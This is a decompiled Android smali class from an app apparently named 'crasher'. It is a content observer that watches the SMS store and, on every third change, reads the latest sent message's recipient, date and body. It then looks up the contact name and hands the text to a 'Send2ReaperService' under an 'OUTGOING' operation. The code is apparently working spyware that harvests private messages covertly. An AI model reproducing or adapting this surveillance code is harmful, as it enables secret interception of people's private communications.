.class Lcom/bigeye/crasher/OutgoingSMSService$1;
.super Landroid/database/ContentObserver;
.source "OutgoingSMSService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bigeye/crasher/OutgoingSMSService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field public counter:I

.field final synthetic this$0:Lcom/bigeye/crasher/OutgoingSMSService;


# direct methods
.method constructor <init>(Lcom/bigeye/crasher/OutgoingSMSService;Landroid/os/Handler;)V
    .locals 1
    .param p1, "this$0"    # Lcom/bigeye/crasher/OutgoingSMSService;
    .param p2, "x0"    # Landroid/os/Handler;

    .prologue
    .line 43
    iput-object p1, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 44
    const/4 v0, 0x1

    iput v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    .prologue
    .line 92
    const/4 v0, 0x1

    return v0
.end method

.method public onChange(Z)V
    .locals 14
    .param p1, "selfChange"    # Z

    .prologue
    .line 49
    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    iget-object v0, v0, Lcom/bigeye/crasher/OutgoingSMSService;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "counter >>>"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget v4, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 51
    iget v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    const/4 v3, 0x3

    if-ne v0, v3, :cond_0

    .line 53
    const-string v0, "content://sms/sent"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 54
    .local v1, "smsURI":Landroid/net/Uri;
    const/4 v0, 0x3

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v3, "address"

    aput-object v3, v2, v0

    const/4 v0, 0x1

    const-string v3, "date"

    aput-object v3, v2, v0

    const/4 v0, 0x2

    const-string v3, "body"

    aput-object v3, v2, v0

    .line 55
    .local v2, "columns":[Ljava/lang/String;
    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-virtual {v0}, Lcom/bigeye/crasher/OutgoingSMSService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 58
    .local v7, "c":Landroid/database/Cursor;
    const/4 v0, 0x0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->moveToPosition(I)Z

    .line 60
    const/4 v0, 0x0

    aget-object v0, v2, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 61
    .local v9, "dest":Ljava/lang/String;
    const/4 v0, 0x1

    aget-object v0, v2, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v8

    .line 62
    .local v8, "date":Ljava/lang/Long;
    const/4 v0, 0x2

    aget-object v0, v2, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 64
    .local v12, "smsContent":Ljava/lang/String;
    new-instance v0, Landroid/text/format/DateFormat;

    invoke-direct {v0}, Landroid/text/format/DateFormat;-><init>()V

    const-string v0, "dd-MMM-yyyy k:m:s"

    invoke-virtual {v8}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-static {v0, v3, v4}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v13

    .line 67
    .local v13, "tmp_dt":Ljava/lang/String;
    new-instance v0, Lcom/bigeye/crasher/ReadContacts;

    iget-object v3, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-virtual {v3}, Lcom/bigeye/crasher/OutgoingSMSService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v0, v3}, Lcom/bigeye/crasher/ReadContacts;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v9}, Lcom/bigeye/crasher/ReadContacts;->getContactName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 68
    .local v11, "name":Ljava/lang/String;
    const-string v0, ""

    if-eq v11, v0, :cond_1

    .line 70
    :goto_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sms to :<"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ">"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ": "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ": "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 74
    .local v10, "finalText":Ljava/lang/String;
    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    iget-object v0, v0, Lcom/bigeye/crasher/OutgoingSMSService;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "CNT: >>"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget v4, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " ::: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    new-instance v6, Landroid/content/Intent;

    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-virtual {v0}, Lcom/bigeye/crasher/OutgoingSMSService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v3, Lcom/bigeye/crasher/Send2ReaperService;

    invoke-direct {v6, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 77
    .local v6, "SvcIntent":Landroid/content/Intent;
    const-string v0, "OPERATION"

    const-string v3, "OUTGOING"

    invoke-virtual {v6, v0, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 78
    const-string v0, "MSG"

    invoke-virtual {v6, v0, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 79
    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    invoke-virtual {v0, v6}, Lcom/bigeye/crasher/OutgoingSMSService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 80
    iget-object v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->this$0:Lcom/bigeye/crasher/OutgoingSMSService;

    iget-object v0, v0, Lcom/bigeye/crasher/OutgoingSMSService;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "counter: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget v4, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ">> "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ">>>THIS"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    const/4 v0, 0x0

    iput v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    .line 87
    .end local v1    # "smsURI":Landroid/net/Uri;
    .end local v2    # "columns":[Ljava/lang/String;
    .end local v6    # "SvcIntent":Landroid/content/Intent;
    .end local v7    # "c":Landroid/database/Cursor;
    .end local v8    # "date":Ljava/lang/Long;
    .end local v9    # "dest":Ljava/lang/String;
    .end local v10    # "finalText":Ljava/lang/String;
    .end local v11    # "name":Ljava/lang/String;
    .end local v12    # "smsContent":Ljava/lang/String;
    .end local v13    # "tmp_dt":Ljava/lang/String;
    :cond_0
    iget v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/bigeye/crasher/OutgoingSMSService$1;->counter:I

    .line 88
    return-void

    .line 68
    .restart local v1    # "smsURI":Landroid/net/Uri;
    .restart local v2    # "columns":[Ljava/lang/String;
    .restart local v7    # "c":Landroid/database/Cursor;
    .restart local v8    # "date":Ljava/lang/Long;
    .restart local v9    # "dest":Ljava/lang/String;
    .restart local v11    # "name":Ljava/lang/String;
    .restart local v12    # "smsContent":Ljava/lang/String;
    .restart local v13    # "tmp_dt":Ljava/lang/String;
    :cond_1
    const-string v11, "unknown"

    goto/16 :goto_0
.end method
